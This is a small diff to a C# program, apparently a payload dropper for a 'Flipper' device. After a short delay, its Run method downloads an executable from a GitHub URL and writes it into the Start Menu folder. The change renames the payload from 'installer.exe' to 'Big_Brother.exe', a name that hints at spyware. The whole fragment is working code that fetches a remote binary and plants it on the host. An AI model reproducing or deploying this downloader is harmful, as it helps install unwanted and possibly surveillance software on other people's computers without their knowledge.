@@ -12,9 +12,9 @@ namespace Flipper
         public void Run()
         {
             Thread.Sleep(2500);
-            byte[] Payload = DownloadPayload("https://github.com/Rudyx77/my_powershell_script/blob/main/installer.exe");
+            byte[] Payload = DownloadPayload("https://github.com/Rudyx77/my_powershell_script/blob/main/Big_Brother.exe");
 			
-            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\installer.exe", Payload))
+            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\Big_Brother.exe", Payload))
             {
             }
         }
